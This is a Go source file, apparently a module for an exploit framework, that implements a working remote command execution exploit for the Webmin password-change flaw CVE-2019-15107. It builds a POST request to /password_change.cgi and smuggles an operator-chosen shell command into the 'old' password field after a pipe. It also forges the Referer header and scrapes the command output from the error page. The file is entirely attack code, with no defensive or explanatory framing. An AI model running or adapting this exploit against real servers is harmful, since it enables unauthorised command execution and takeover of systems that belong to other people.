package exp_Webmin

import (
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"regexp"
	"strings"
)

type Exp_CVE_2019_15107 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2019_15107) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	headers := self.GetInitExpHeaders()
	payload := `user=rootxx&pam=&expired=2&old=test|cmd&new1=test2&new2=test2`
	payload = strings.Replace(payload, "cmd", cmd, 1)
	headers.Set("Referer", self.Params.BaseParam.Target+"/session_login.cgi")
	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/password_change.cgi"), payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode == 200 && strings.Contains(httpresp.Body, `Failed to change password : The current password is incorrect`) {
		expResult.Status = true
		result := regexp.MustCompile(`<center><h3>Failed to change password : The current password is incorrect([\s\S]*)</h3></center>`).FindStringSubmatch(httpresp.Body)
		expResult.Result = result[1]
	} else {
		self.EchoErrMsg("漏洞利用失败！")
	}
	return
}
func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2019_15107{}, "exp_CVE_2019_15107.yml")
}
